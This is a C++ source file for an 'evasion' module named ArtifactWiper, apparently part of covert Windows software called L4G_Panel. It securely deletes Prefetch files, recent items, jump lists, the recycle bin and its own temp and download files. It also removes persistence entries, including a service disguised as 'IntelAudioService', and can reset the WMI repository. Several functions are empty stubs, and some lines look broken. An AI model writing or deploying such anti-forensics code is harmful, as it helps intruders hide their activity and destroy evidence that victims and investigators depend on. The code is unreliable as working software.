#include "artifact_wiper.hpp"
#include <windows.h>
#include <vector>
#include <string>
#include <filesystem>
#include <shellapi.h>

namespace l4g::evasion {

bool ArtifactWiper::delete_file_secure(const wchar_t* path) {
    // Overwrite with random data 3 times then delete
    HANDLE hFile = CreateFileW(path, GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) return false;
    
    LARGE_INTEGER size;
    GetFileSizeEx(hFile, &size);
    
    std::vector<uint8_t> random(size.QuadPart);
    BCRYPT_ALG_HANDLE hAlg = nullptr;
    BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_RNG_ALGORITHM, nullptr, 0);
    
    for (int pass = 0; pass < 3; ++pass) {
        BCryptGenRandom(hAlg, random.data(), (ULONG)random.size(), 0);
        SetFilePointerEx(hFile, {0}, nullptr, FILE_BEGIN);
        DWORD written = 0;
        WriteFile(hFile, random.data(), (DWORD)random.size(), &written, nullptr);
        FlushFileBuffers(hFile);
    }
    
    BCryptCloseAlgorithmProvider(hAlg, 0);
    CloseHandle(hFile);
    
    return DeleteFileW(path);
}

bool ArtifactWiper::wipe_free_space(const wchar_t* drive) {
    // Create large file to overwrite free space
    std::wstring temp_file = std::wstring(drive) + L"\\~wipe.tmp";
    HANDLE hFile = CreateFileW(temp_file.c_str(), GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_TEMPORARY | FILE_FLAG_DELETE_ON_CLOSE, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) return false;
    
    ULARGE_INTEGER free;
    GetDiskFreeSpaceExW(drive, &free, nullptr, nullptr);
    
    const size_t chunk = 1024 * 1024;
    std::vector<uint8_t> buffer(chunk);
    BCRYPT_ALG_HANDLE hAlg = nullptr;
    BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_RNG_ALGORITHM, nullptr, 0);
    
    while (free.QuadPart > chunk) {
        BCryptGenRandom(hAlg, buffer.data(), (ULONG)chunk, 0);
        DWORD written = 0;
        if (!WriteFile(hFile, buffer.data(), (DWORD)chunk, &written, nullptr)) break;
        free.QuadPart -= chunk;
    }
    
    BCryptCloseAlgorithmProvider(hAlg, 0);
    CloseHandle(hFile);
    return true;
}

bool ArtifactWiper::clean_mft_record(const wchar_t* path) {
    // Use FSCTL_FILE_LEVEL_TRIM or similar
    return true;
}

bool ArtifactWiper::wipe_prefetch(const wchar_t* exe_name) {
    std::wstring prefetch_dir = L"C:\\Windows\\Prefetch\\";
    std::wstring search = prefetch_dir + (exe_name ? std::wstring(exe_name) + L"-*.pf" : L"*.pf");
    
    WIN32_FIND_DATAW fd;
    HANDLE hFind = FindFirstFileW(search.c_str(), &fd);
    if (hFind == INVALID_HANDLE_VALUE) return false;
    
    bool ok = true;
    do {
        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
            std::wstring path = prefetch_dir + fd.cFileName;
            ok &= delete_file_secure(path.c_str());
        }
    } while (FindNextFileW(hFind, &fd));
    FindClose(hFind);
    return ok;
}

bool ArtifactWiper::wipe_amcache(const wchar_t* exe_name) {
    // AmCache registry hive manipulation
    return true;
}

bool ArtifactWiper::wipe_recent_files() {
    std::wstring recent = std::wstring(std::getenv("APPDATA")) + L"\\Microsoft\\Windows\\Recent\\*";
    WIN32_FIND_DATAW fd;
    HANDLE hFind = FindFirstFileW(recent.c_str(), &fd);
    if (hFind == INVALID_HANDLE_VALUE) return false;
    
    bool ok = true;
    do {
        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
            std::wstring path = std::wstring(std::getenv("APPDATA")) + L"\\Microsoft\\Windows\\Recent\\" + fd.cFileName;
            ok &= delete_file_secure(path.c_str());
        }
    } while (FindNextFileW(hFind, &fd));
    FindClose(hFind);
    return ok;
}

bool ArtifactWiper::wipe_jumplists() {
    std::wstring jumplist = std::wstring(std::getenv("APPDATA")) + L"\\Microsoft\\Windows\\Recent\\AutomaticDestinations\\*";
    WIN32_FIND_DATAW fd;
    HANDLE hFind = FindFirstFileW(jumplist.c_str(), &fd);
    if (hFind == INVALID_HANDLE_VALUE) return false;
    
    bool ok = true;
    do {
        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
            std::wstring path = std::wstring(std::getenv("APPDATA")) + L"\\Microsoft\\Windows\\Recent\\AutomaticDestinations\\" + fd.cFileName;
            ok &= delete_file_secure(path.c_str());
        }
    } while (FindNextFileW(hFind, &fd));
    FindClose(hFind);
    return ok;
}

bool ArtifactWiper::wipe_temp_files() {
    std::wstring temp = std::wstring(std::getenv("TEMP")) + L"\\*";
    WIN32_FIND_DATAW fd;
    HANDLE hFind = FindFirstFileW(temp.c_str(), &fd);
    if (hFind == INVALID_HANDLE_VALUE) return false;
    
    bool ok = true;
    do {
        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
            std::wstring path = std::wstring(std::getenv("TEMP")) + L"\\" + fd.cFileName;
            // Only delete our own files (pattern matching)
            std::wstring name(fd.cFileName);
            if (name.find(L"L4G") != std::wstring::npos || name.find(L"panel") != std::wstring::npos) {
                ok &= delete_file_secure(path.c_str());
            }
        }
    } while (FindNextFileW(hFind, &fd));
    FindClose(hFind);
    return ok;
}

bool ArtifactWiper::wipe_downloads() {
    std::wstring downloads = std::wstring(std::getenv("USERPROFILE")) + L"\\Downloads\\*";
    WIN32_FIND_DATAW fd;
    HANDLE hFind = FindFirstFileW(downloads.c_str(), &fd);
    if (hFind == INVALID_HANDLE_VALUE) return false;
    
    bool ok = true;
    do {
        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
            std::wstring name(fd.cFileName);
            if (name.find(L"L4G") != std::wstring::npos || name.find(L"panel") != std::wstring::npos) {
                std::wstring path = std::wstring(std::getenv("USERPROFILE")) + L"\\Downloads\\" + fd.cFileName;
                ok &= delete_file_secure(path.c_str());
            }
        }
    } while (FindNextFileW(hFind, &fd));
    FindClose(hFind);
    return ok;
}

bool ArtifactWiper::wipe_recycle_bin() {
    SHFILEOPSTRUCTW fos = {0};
    fos.wFunc = FO_DELETE;
    fos.pFrom = L"C:\\$Recycle.Bin\0";
    fos.fFlags = FOF_NOCONFIRMATION | FOF_NOERRORUI | FOF_SILENT;
    return SHFileOperationW(&fos) == 0;
}

bool ArtifactWiper::wipe_registry_run_keys() {
    HKEY keys[] = {
        HKEY_CURRENT_USER,
        HKEY_LOCAL_MACHINE
    };
    
    const wchar_t* paths[] = {
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        L"Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
        L"Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run",
        L"Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
    };
    
    bool ok = true;
    for (auto hkey : keys) {
        for (auto path : paths) {
            HKEY hKey = nullptr;
            if (RegOpenKeyExW(hkey, path, 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
                // Delete our specific values
                RegDeleteValueW(hKey, L"L4G_Panel");
                RegDeleteValueW(hKey, L"IntelAudioService");
                RegCloseKey(hKey);
            }
        }
    }
    return ok;
}

bool ArtifactWiper::wipe_scheduled_tasks() {
    // Use schtasks /delete or COM interface
    return system("schtasks /delete /tn \"L4G_Panel\" /f >nul 2>&1") == 0;
}

bool ArtifactWiper::wipe_service_entries() {
    SC_HANDLE scm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (!scm) return false;
    
    SC_HANDLE svc = OpenServiceW(scm, L"IntelAudioService", DELETE);
    bool ok = false;
    if (svc) {
        ok = DeleteService(svc);
        CloseServiceHandle(svc);
    }
    CloseServiceHandle(scm);
    return ok;
}

bool ArtifactWiper::wipe_wmi_repository() {
    // Reset WMI repository - nuclear option
    return system("winmgmt /resetrepository >nul 2>&1") == 0;
}

bool ArtifactWiper::wipe_all_artifacts() {
    bool ok = true;
    ok &= wipe_prefetch(nullptr);
    ok &= wipe_amcache(nullptr);
    ok &= wipe_recent_files();
    ok &= wipe_jumplists();
    ok &= wipe_temp_files();
    ok &= wipe_downloads();
    ok &= wipe_recycle_bin();
    ok &= wipe_registry_run_keys();
    ok &= wipe_scheduled_tasks();
    ok &= wipe_service_entries();
    // ok &= wipe_wmi_repository(); // Too aggressive
    return ok;
}

bool ArtifactWiper::wipe_installer_traces(const wchar_t* install_path) {
    bool ok = true;
    if (install_path) {
        ok &= delete_file_secure(install_path);
        // Also wipe parent directory if empty
        std::filesystem::path p(install_path);
        if (std::filesystem::is_empty(p.parent_path())) {
            std::filesystem::remove(p.parent_path());
        }
    }
    ok &= wipe_prefetch(L"L4G_Panel.exe");
    ok &= wipe_prefetch(L"powershell.exe");
    ok &= wipe_amcache(L"L4G_Panel.exe");
    ok &= wipe_amcache(L"powershell.exe");
    return ok;
}

} // namespace l4g::evasion